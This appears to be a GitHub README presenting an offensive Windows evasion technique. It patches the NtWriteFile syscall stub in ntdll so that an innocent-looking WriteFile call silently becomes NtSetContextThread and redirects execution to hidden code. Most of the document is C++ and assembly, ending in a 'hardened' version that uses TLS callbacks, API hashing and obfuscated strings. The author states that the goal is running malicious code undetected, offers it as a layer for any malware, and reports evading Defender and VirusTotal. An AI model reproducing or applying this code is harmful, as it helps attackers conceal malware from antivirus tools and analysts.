************************************************************
\***Heads Up**\*  The build architecture is specifically targeted 
for my specific Windows 10 x64 build.
Different Windows builds or architectures will have different
syscall numbers, calling conventions and assembly.
Tweaking will be needed.
**********************************************************************
## Evasion
I've used a "novel" idea which I never encountered or heard of 
before, the idea of messing with the control flow of a program
by invoking a thread syscall while impersonating as an authentic and 
unharmful _KERNEL32_ API function, this time I chose making a twin 
for the well known `WriteFile()` function.
This makes the life of an Anti Virus Solution or reverse engineer
way more difficult and tedious to do. 

### High Level API's Breakdown & Overview 
The intended way of modifying a thread context is via  
`SetThreadContext()` WinAPI call which looks like this 

```cpp
BOOL (NTAPI SetThreadContext) (
  HANDLE hThread;
  CONTEXT context;
)
```

When we call this function, it expects us to pass a thread handle
and a valid thread context structure to set values accordingly.
This is the context struct according to the MSDN

```cpp
typedef struct _CONTEXT {
  DWORD64 P1Home;
  DWORD64 P2Home;
  DWORD64 P3Home;
  DWORD64 P4Home;
  DWORD64 P5Home;
  DWORD64 P6Home;
  DWORD   ContextFlags;
  DWORD   MxCsr;
  WORD    SegCs;
  WORD    SegDs;
  WORD    SegEs;
  WORD    SegFs;
  WORD    SegGs;
  WORD    SegSs;
  DWORD   EFlags;
  DWORD64 Dr0;
  DWORD64 Dr1;
  DWORD64 Dr2;
  DWORD64 Dr3;
  DWORD64 Dr6;
  DWORD64 Dr7;
  DWORD64 Rax;
  DWORD64 Rcx;
  DWORD64 Rdx;
  DWORD64 Rbx;
  DWORD64 Rsp;
  DWORD64 Rbp;
  DWORD64 Rsi;
  DWORD64 Rdi;
  DWORD64 R8;
  DWORD64 R9;
  DWORD64 R10;
  DWORD64 R11;
  DWORD64 R12;
  DWORD64 R13;
  DWORD64 R14;
  DWORD64 R15;
  DWORD64 Rip;
  union {
    XMM_SAVE_AREA32 FltSave;
    NEON128         Q[16];
    ULONGLONG       D[32];
    struct {
      M128A Header[2];
      M128A Legacy[8];
      M128A Xmm0;
      M128A Xmm1;
      M128A Xmm2;
      M128A Xmm3;
      M128A Xmm4;
      M128A Xmm5;
      M128A Xmm6;
      M128A Xmm7;
      M128A Xmm8;
      M128A Xmm9;
      M128A Xmm10;
      M128A Xmm11;
      M128A Xmm12;
      M128A Xmm13;
      M128A Xmm14;
      M128A Xmm15;
    } DUMMYSTRUCTNAME;
    DWORD           S[32];
  } DUMMYUNIONNAME;
  M128A   VectorRegister[26];
  DWORD64 VectorControl;
  DWORD64 DebugControl;
  DWORD64 LastBranchToRip;
  DWORD64 LastBranchFromRip;
  DWORD64 LastExceptionToRip;
  DWORD64 LastExceptionFromRip;
} CONTEXT, *PCONTEXT;
```

Its a fairly large structure but we can obviously see how it can
be utilized for malicious intent like modifying the instruction 
pointer value.

This is the function declaration for `WriteFile()` according to the MSDN

```cpp
BOOL WriteFile(
  [in]                HANDLE       hFile,
  [in]                LPCVOID      lpBuffer,
  [in]                DWORD        nNumberOfBytesToWrite,
  [out, optional]     LPDWORD      lpNumberOfBytesWritten,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```

Our final goal is creating a duplicate for this `WriteFile()` function, and 
through calling it will modify our running thread instruction pointer  
like its done the intended way via the WinAPI `SetThreadContext()`.
For doing so we will need to thoroughly understand the call chain for
both of our functions, what are the prerequisites and what is actually
going on from User-Mode until the syscall that transfer the execution
to the Kernel, lets dive in to understand the innerworkings.

### Research & Development: In-Depth Look 
This is a simple program that uses the intended way of 
modifying our running thread instruction pointer (RIP)

```cpp
// Function declaration
void myFunc();

int main() {
    // Obtain current thread's handle
    HANDLE hThread = GetCurrentThread();

    // Get the current running thread context
    CONTEXT threadContext;
    threadContext.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(hThread, &threadContext);

    // Modify the RIP register to point to myFunc
    threadContext.Rip = (DWORD64)(&myFunc);
        
    // Set the modified context back to the thread
    SetThreadContext(hThread, &threadContext);
    
    return 0;
}

// Definition of the function
void myFunc() {
    std::cout << "this is working" << std::endl;
}
```

As you can see all the function does is retrieving a handle to the current  
thread, setting `ContextFlags = CONTEXT_CONTROL` to indicate that we  
will modify the control flow registers of the program (RIP/RSP/RBP..) and setting  
RIP to the address of myFunc().  

Lets disassemble our binary to get an in-depth look of what is  
actually going on  

<img width="400" alt="mainFunc" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/6a3a5bc7-f1f1-48f9-9221-2fd835057966">


\#Note\#  Before going forward we will need to know the x64 calling conventions.
According to the MSDN the first four arguments are passed through 
RCX, RDX, R8 & R9 accordingly, the rest will be passed on the stack from the last 
to the fifth ( arg10, arg9, arg8.... arg5). 
Ok now we can have a look, our current goal is understanding `SetThreadContext()`.

#### **SetThreadContext Breakdown**
There are 2 prerequisite arguments to make a valid call
for this function the intended way.
##### 1. Thread Handle
The handle to our current thread is passed through RCX   
and obtained via `GetCurrentThread()`  

 <img width="373" alt="GetCurrentThread" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/fefe397b-b32c-4fae-b210-64e37ef57f45">


As we see its just a pseudo handle which means there's a special statically
set value to reference our running thread 0FFFFFFFFFFFFFFFEh (-2).  

##### 2. Thread Context
A pointer to our thread context structure is being passed to the  
function through RDX and obtained via the `GetThreadContext()` function  
on our thread handle like so

<img width="611" alt="GetThreadContext" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/caa9fcd3-4c57-41f0-a12f-cb9a5061ea74">


Obviously this function doesn't just set some hardcoded value as 
the thread context because every thread context is different, so
to get the actual values for the context, the function calls the 
ntdll function `NtGetContextThread()` which pass execution to the 
kernel side which in return fill our structure with the thread context.

Our goal is to eventually invoke the syscall like `NtGetContextThread()` 
does but making it look like its a `WriteFile`() call, so calling a function 
like `GetThreadContext()` before hand will let reversers know what's going 
on, to avoid that we will need to somehow create the context structure 
ourselves without any prior function calls, it will make more sense and 
we will go in-depth on how we can do it later on.

After getting an high view of how we are going to get the prerequisites
for calling `SetThreadContext()` , now lets see what's going on inside the 
function

<img width="628" alt="SetThreadContext" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/61c31a24-aaea-42ae-a159-072201e97fc7">


We are lucky! , there is no reordering of variables or actually nothing
being preformed before the ntdll function `NtSetContextThread()` which
invoke the syscall, its simply a basic wrapper with error handling for the ntdll function.    

<img width="801" alt="NtSetContextThreadGraph" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/7fe1e5d2-1bf1-4994-b00d-e1714c72f8ee">


Finally, when the syscall is being invoked, all the kernel expects 
is a pseudo thread handle via RCX (just a hardcoded value in our
case since we want to modify our running thread) and a pointer to
a memory address that holds a thread context structure via RDX.
When we achieve these two prerequisites than we can 
successfully do the syscall routine. 

#### Context Structures 
lets go back and see how we can create a valid context 
ourselves without calling a function to do so. 
I've compiled a basic program that get the thread context 
using `GetThreadContext()` , than I dumped the structure 
with IDA and set it as a variable in my code.
I've compiled the code again and compared in memory the 
structure I hardcoded and a structure I got back again from
this time using `GetThreadContext()`, it was practically the same. 
There were only two differences in the fields corresponding for 
RIP & RSP, this makes sense first of all because of ASLR.

To solve this program we will need to dynamically retrieve  
the address of the stack and set the corresponding RIP value
to be the address of the function we want to jump to.
to get the value of the stack I've just used this simple function

```asm 
	RetRSP proc
	mov rax, rsp
	ret
	RetRSP endp
```

for setting the RIP I just modified the structure itself 

```cpp
_CONTEXT threadContext = {
	14757395258967641292ui64, // values copied from dump
	14757395258967641292ui64,
	,
	,
	...
	000000000000ui64, // RSP  will be set later 
	,
	,
	...
	&myFunc, { // RIP
    {
      ...
};

```

the final implementation of this idea look something 
like this 

```cpp 
// function decleration
void myFunc();

// Dumped structure with modification
_CONTEXT threadContext = {
	14757395258967641292ui64, 
	14757395258967641292ui64,
	,
	,
	,
	...
	000000000000ui64, // RSP  will be set later 
	,
	,
	...
	&myFunc, { // RIP
    {
      ...
};

int main(){
	// Value of current thread handle
	HANDLE hThread = ((HANDLE)(LONG_PTR)-2); 
	threadContext.Rsp = (DWORD64)RetRSP();
	SetThreadContext(hThread, &threadContext);
	return 0;
}

void myFunc(){
	printf("hello world");
}
```

Running the program will print "hello world" to the console 
and we did it without calling `GetThreadContext()`.

#### **WriteFile Breakdown** 
Next, lets understand how does `WriteFile()` works from 
the moment we are calling it from user-mode until the 
syscall is being invoked, this is a simple program that
grabs the handle for STDOUT and print to it using `WriteFile()`.

```cpp
int main() {
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);  
    const char* message = "Hello World!";

    DWORD bytesWritten;
    BOOL success = WriteFile(hStdOut, message, strlen(message),   &bytesWritten, NULL);

    return 0;
}
```

Now lets disassemble it to see what is being done internally  

<img width="259" alt="mainFunc2" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/3e5cf735-a40f-40cc-baa8-3da45d7b098a">

  
As we can see, according to the x64 calling convention, the arguments to `WriteFile()` are being moved first to last via RCX,RDX,R8,R9 and onto the stack accordingly.  
Remember, all we want to do is trace down the call chain from `WriteFile()` until the Ntdll call that invoke the syscall to check which of the arguments will end up in RCX & RDX so we can make sure they will contain the thread handle and a context structure pointer accordingly.
Here's the decompiled  `WriteFile()` function which I made more easily readable from IDA decompiler

```c
__int64 __fastcall kernelbase_WriteFile(
        HANDLE hFile,
        LPCVOID lpBuffer,
        DWORD nNumberOfBytesToWrite,
        LPDWORD lpNumberOfBytesWritten,
        LPOVERLAPPED lpOverlapped)
{
  HANDLE ourFileHandle; // rdi
  LPOVERLAPPED v8; // rsi
  NTSTATUS status; // eax
  __int64 v10; // rcx
  void *hEvent; // rdx
  LPOVERLAPPED v13; // r9
  unsigned int v14; // eax
  int v15; // eax
  __int128 IoStatusBlock; // [rsp+50h] [rbp-18h] BYREF
  unsigned int Offset; // [rsp+70h] [rbp+8h] BYREF
  unsigned int OffsetHigh; // [rsp+74h] [rbp+Ch]
  LPDWORD v19; // [rsp+88h] [rbp+20h]

  v19 = lpNumberOfBytesWritten;
  ourFileHandle = hFile;
  IoStatusBlock = 0i64;
  if ( lpNumberOfBytesWritten )
    *lpNumberOfBytesWritten = 0;
  if ( (unsigned int)hFile >= INVALID_HANDLE_VALUE  )
  {
    switch ( (_DWORD)hFile )
    {
      case 4294967284:
        ourFileHandle = NtCurrentPeb()->ProcessParameters->Reserved2[4];
        break;
      case 4294967285:
        ourFileHandle = NtCurrentPeb()->ProcessParameters->Reserved2[3];
        break;
      case 4294967286:
        ourFileHandle = NtCurrentPeb()->ProcessParameters->Reserved2[2];
        break;
    }
  }
  v8 = lpOverlapped;
  if ( lpOverlapped )
  {
    lpOverlapped->Internal = 259i64;
    Offset = v8->Offset;
    OffsetHigh = v8->OffsetHigh;
    hEvent = v8->hEvent;
    v13 = 0i64;
    if ( ((unsigned __int8)hEvent & 1) == 0 )
      v13 = v8;
    v14 = NtWriteFile(ourFileHandle, hEvent, 0i64, v13, v8, lpBuffer, nNumberOfBytesToWrite, &Offset, 0i64);
    if ( v14 != 259 && (v14 & 0xC0000000) != -1073741824 )
    {
      if ( lpNumberOfBytesWritten )
        *lpNumberOfBytesWritten = v8->InternalHigh;
      return 1i64;
    }
    v10 = v14;
LABEL_15:
    ((void (__fastcall *)(__int64))sub_7FFAD6D25BF0)(v10);
    return 0i64;
}
  status = NtWriteFile(ourFileHandle, 0i64, 0i64, 0i64, &IoStatusBlock, lpBuffer, nNumberOfBytesToWrite, 0i64, 0i64);
  v10 = status;
  if ( status == 259 )
  {
    v15 = ((__int64 (__fastcall *)(HANDLE, _QWORD, _QWORD))ntdll_NtWaitForSingleObject)(ourFileHandle, 0i64, 0i64);
    v10 = (unsigned int)v15;
    if ( v15 >= 0 )
      v10 = (unsigned int)IoStatusBlock;
  }
  if ( (int)v10 < 0 )
  {
    if ( (v10 & 0xC0000000) == 0x80000000 && lpNumberOfBytesWritten )
      *lpNumberOfBytesWritten = DWORD2(IoStatusBlock);
    goto LABEL_15;
  }
  if ( lpNumberOfBytesWritten )
    *lpNumberOfBytesWritten = DWORD2(IoStatusBlock);
  return 1i64;
}
```

Let's break it down for our relevant section, first the
function check if the handle is invalid using a switch statement. 
After that there are possibly two ways of invoking the `NtWriteFile()` call.
1. Supplying an overlapped structure in our call
	-> will result in passing its event field via RDX
2. Supplying null overlapped structure in our call
	-> will result in passing 0 via RDX
What it actually means is that upon the `NtWriteFiile()` call
the handle we pass in the first argument will remain in RCX 
and the fifth argument we pass as the overlapped->event
will be the second argument passed in RDX.
Finally if we pass a handle to our running thread instead 
of a handle to a normal file, and we make an overlapped 
structure which event field points to our thread context 
structure, than we set our arguments for the kernel to 
perform the syscall for setting the thread context instead 
of writing to a file.
This is an overlapped structure according to the MSDN

```cpp
typedef struct OVERLAPPED{
  ULONG_PTR Internal;
  ULONG_PTR InternalHigh;
  union {
    struct {
      DWORD Offset;
      DWORD OffsetHigh;
    } DUMMYSTRUCTNAME;
    PVOID Pointer;
  } DUMMYUNIONNAME;
  HANDLE    hEvent;
} OVERLAPPED, *LPOVERLAPPED;
```

the hEvent field is of type HANDLE, instead of holding a 
handle we will set it to hold our malicious thread context structure memory address.
Combining the code we wrote before and what we discovered
now we can set up a call like this 

```cpp
HANDLE hStdOut = ((HANDLE)(LONG_PTR)-2);
const char* message = "Hello World!";
OVERLAPPED ovlp = { 0 };
threadContext.Rsp = (DWORD64)RetRSP();
ovlp.hEvent = &threadContext;

WriteFile(hStdOut,message,strlen(message), NULL, &ovlp);
```

At this point our main function will contain a "normal"
looking `WriteFile()` function call, but down the road 
at the syscall moment we are ready to perform a call 
for `NtSetContextThread()` instead.
Lastly the question is how we are going to call the thread
syscall instead of the write syscall if that section of the 
code is not ours to modify, rather loaded dynamically at
run time. There's a simple solution for it.

### NTAPI Hooking
Lets compare between the two calls to see what are the 
differences between the `NtWriteFile()` syscall and the 
`NtSetContextThread()` syscall 

<img width="283" alt="NtWriteFile" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/04a02d4e-e15d-495a-b941-a08d792029ca">

Here's the normal routine of a syscall in windows performed 
by ntdll.dll, first you set r10 to the value of RCX (referenced 
object handle ), than set EAX to the corresponding SSN and 
finally call the syscall instruction(the check performed before 
the syscall is out of scope and non relevant in our case).
Earlier when looking at `NtSetContextThread()` we can see from
the picture that the routine is obviously the same and the 
difference is only the specified SSN, for `NtWriteFile()` its 8 
and for `NtSetContextThread()` its 18DH.
We can dynamically locate the address of `NtWriteFile()` at
run time and overwrite the memory to alter the SSN number 
to 18DH, now when the `WriteFile()` function will be called, 
it will call `NtWriteFile()` like we saw earlier **BUT** with the SSN
to set the context of the thread.
We already wrote the code that managed to set the prerequisites
for the `SetThreadContext()` function and new we hooked `WriteFile()`
to actually call it. 
This piece of code combines what we did 
```cpp
// function decleration
void myFunc();

// Dumped structure with modification
_CONTEXT threadContext = {
	14757395258967641292ui64, 
	14757395258967641292ui64,
	,
	,
	,
	...
	000000000000ui64, // RSP  will be set later 
	,
	,
	...
	&myFunc, { // RIP
    {
      ...
};

int main(){

	// Hooking the WriteFile function
	LPVOID baseAddress = GetProcAddress(GetModuleHandle(
	L"ntdll"), "NtWriteFile");
	WriteProcessMemory( GetCurrentProcess(),
						baseAddress,
						"\x4c" "\x8b" "\xd1" "\xb8" "\x8D" "\x01",
						6,
						NULL
	);

	// Setting our argumetns for SetThreadContext
	HANDLE hStdOut = ((HANDLE)(LONG_PTR)-2);
	const char* message = "Hello World!";
	OVERLAPPED ovrlp = { 0 };
	threadContext.Rsp = (DWORD64)RetRSP();
	ovrlp.hEvent = &threadContext;
	WriteFile(hStdOut, message, strlen(message), NULL, &ovrlp);
	return 0;
}

void myFunc(){
	// code execution will jump here from WriteFile
}

```

That's it, that's how I've used the concept  impersonation and 
thread manipulation to execute malicious code. 
For real world implementation some security vendors may 
still flag for malicious activity, so I've wrote an hardened version
of this concept that leverage TLS callback chains and API Hashing to
make the work of detecting and reversing more of a pain before 
even approaching the main idea of the impersonation.

Here's a general overview of what it looks like.
Full Working RAT implementation as an organized  
project can be referenced in my C2_Dump repository.

```cpp 

#include<windows.h>
#include<iostream>

/*************************************************
* TLS Setup                                      *
*************************************************/

// letting the linker know we are using TLS callbacks
#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#endif


void	tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext);
void* tls_callback_secret(PVOID hModule, DWORD dwReason, PVOID pContext);


EXTERN_C typedef BOOL(NTAPI* VirtualProtect_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

EXTERN_C typedef BOOL(NTAPI* WriteProcessMemory_t)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

// Creating a segments for the function 
#ifdef _WIN64
#pragma const_seg(".CRT$XLB")
EXTERN_C const
#else
#pragma data_seg(".CRT$XLB")
EXTERN_C
#endif

// setting TLS entry to tls_callback1
PIMAGE_TLS_CALLBACK tls_callback_func = (PIMAGE_TLS_CALLBACK)tls_callback1;

#ifdef _WIN64
#pragma const_seg()
#else
#pragma data_seg()
#endif 

 
DWORD getHashFromString(char* string) {
    size_t stringLength = strnlen_s(string, 50);
    DWORD hash = 0x35;
    for (size_t i = 0; i < stringLength; i++) {
        hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
    }
    return hash;
}


// CRT$XLB segment function implementation 
void tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext) {

    if (dwReason == DLL_PROCESS_ATTACH) {
       
        PDWORD functionAddress = (PDWORD)0;
        HMODULE libraryBase = LoadLibraryA("kernel32");

		// Locating the Export Directory
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-
        >e_lfanew);

        DWORD_PTR exportDirectoryRVA = imageNTHeaders-
        >OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)
        ((DWORD_PTR)libraryBase + exportDirectoryRVA);

        // Get RVAs to exported function
        PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfFunctions);
        PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfNames);
        PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfNameOrdinals);

        for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {

            DWORD functionNameRVA = addressOfNamesRVA[i];
            DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
            char* functionName = (char*)functionNameVA;
            DWORD_PTR functionAddressRVA = 0;

            // Calculate Hase 
            DWORD functionNameHash = getHashFromString(functionName);
            DWORD hash = 0x00583c854; // for virtual protect
            if (functionNameHash == hash) {
                functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
                functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
            }
        }

        // Get location for next element in the array of TLS callbacks in memory
        PIMAGE_TLS_CALLBACK* dynamic_callback = (PIMAGE_TLS_CALLBACK*)&tls_callback_func + 1;
        VirtualProtect_t pVirtualProtect = (VirtualProtect_t)functionAddress;
        DWORD old;
        pVirtualProtect(dynamic_callback, sizeof(dynamic_callback), PAGE_EXECUTE_READWRITE, &old);
        // call the second tls function
		*dynamic_callback = (PIMAGE_TLS_CALLBACK)tls_callback_secret(NULL, 1, NULL);
    }
    return NULL;
}


void* tls_callback_secret(PVOID hModule, DWORD dwReason, PVOID pContext){

    if (dwReason == DLL_PROCESS_ATTACH) {

		// ntdll & NtWriteFile obfuscated to avoid static analysis 
        wchar_t myLib[] = { 111, 117, 101, 109, 109 ,1 }; 
        char myModule[] = { 79, 117, 88, 115 ,106 ,117 ,102, 71, 106 ,109 ,102 ,1 }; 

        // Decode 
        for (int i = 0; i < 6; i++) {
            myLib[i] = myLib[i] - 1;
        }
        for (int i = 0; i < 12; i++) {
            myModule[i] = myModule[i] - 1;
        }

        PDWORD functionAddress = (PDWORD)0;
        HMODULE libraryBase = LoadLibraryW(L"kernel32");

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-
        >e_lfanew);

        DWORD_PTR exportDirectoryRVA = imageNTHeaders-
        >OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)
        ((DWORD_PTR)libraryBase + exportDirectoryRVA);

        PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfFunctions);
        PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfNames);
        PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-
        >AddressOfNameOrdinals);

        for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {

            DWORD functionNameRVA = addressOfNamesRVA[i];
            DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
            char* functionName = (char*)functionNameVA;
            DWORD_PTR functionAddressRVA = 0;

            DWORD functionNameHash = getHashFromString(functionName);
            DWORD ProcMemhash = 0x90167b9; // for WriteProcessMemory
            if (functionNameHash == ProcMemhash) {
                functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
                functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
            }
        }

        // Hook NtWriteFile 
        WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)functionAddress;
        LPVOID baseAddress = GetProcAddress(GetModuleHandle(myLib), myModule);
        pWriteProcessMemory((HANDLE)(LONG_PTR)-1, baseAddress, "\x4c" "\x8b" "\xd1" "\xb8" "\x8D" 
        "\x01", 6, NULL); 


    }
    return NULL;
}

/*********************************************************
* Thread Context Setup                                   * 
*********************************************************/

void actualMain()

_CONTEXT firstJumpContext = {
        14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,14757395258967641292ui64,
        1048577u,3435973836u,51u,52428u,52428u,52428u,52428u,43u,582u,
        14757395258967641292ui64,14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,
        000000000000ui64,        // RSP will be dynamically set 
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        14757395258967641292ui64,
        (DWORD64)&actualMain,    // RIP 
    {
    {
      52428u,52428u,204u,204u,52428u,3435973836u,52428u,52428u,
      3435973836u,52428u,52428u,3435973836u,3435973836u,
      {
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 }
      },
      {
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 },
        { 14757395258967641292ui64, -3689348814741910324i64 }
      },
      {
        204u,204u,204u,204u,204u,204u,
        204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,
        204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,
        204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,
        204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,
        204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u,204u
      }
    }
    },
	  {
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 },
	    { 14757395258967641292ui64, -3689348814741910324i64 }
	  },
        14757395258967641292ui64,14757395258967641292ui64,14757395258967641292ui64,
        14757395258967641292ui64,14757395258967641292ui64,14757395258967641292ui64
};


// Exported main that utilze hooked WriteFile
__declspec(dllexport) int main() {
    HANDLE hStdOut = ((HANDLE)(LONG_PTR)-2);
    const char* message = "Hello World!";
    OVERLAPPED ovrlpd = { 0 };
    checkDebugContext.Rsp = (DWORD64)RetRSP();
    ovrlpd.hEvent = &checkDebugContext;
    BOOL success = WriteFile(hStdOut, message, strlen(message), NULL, &ovrlpd);
    return 0;
}

// where our malicious code can reside hidden 
void actualMain(){
	std::ofstream{ "Hello.txt" };
}
```

## Conclusion
This was the basic idea and implementation of function impersonation to
execute malicious code undetected.
It can be used as is, or as an extra layer mechanism to harden the detection
and reversing of any other malware implementation out there.
Running it against Microsoft Defender on my pc didn't raise any flags as
well as uploading it to virus total (only 2 most likely false flags).

<img width="509" alt="virus_total" src="https://github.com/h3xDum/Kernel32_Impersonation/assets/58906938/8df51c99-ba45-47ac-9381-21ad13a73e09">














































